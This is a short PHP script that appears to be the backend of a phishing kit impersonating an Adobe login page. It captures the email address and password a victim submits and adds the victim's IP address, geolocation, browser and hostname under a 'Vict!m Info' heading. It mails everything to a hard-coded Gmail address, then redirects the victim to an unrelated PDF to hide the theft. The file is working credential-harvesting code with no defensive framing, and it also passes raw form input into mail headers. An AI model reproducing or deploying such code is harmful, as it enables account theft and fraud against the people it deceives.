<?
require("min.php");
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Online Info-----------------------\n";
$message .= "Email Address:             : ".$_POST['vision']."\n"; 
$message .= "Password:             : ".$_POST['dream']."\n";
$co = $_POST['vision']; 
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY $PG Bon-------------\n";
$domain_name = substr(strrchr($co, "@"), 1);
$send = "lovethis2220@gmail.com";
$subject = "Off Adobe From $ip";
$headers = "From: Off Room <lovethis2220@gmail.com>";
$headers .= $_POST['idinri']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	

header("Location: http://www3.weforum.org/docs/WEF_Global_Risk_Report_2020.pdf");
	 
?>
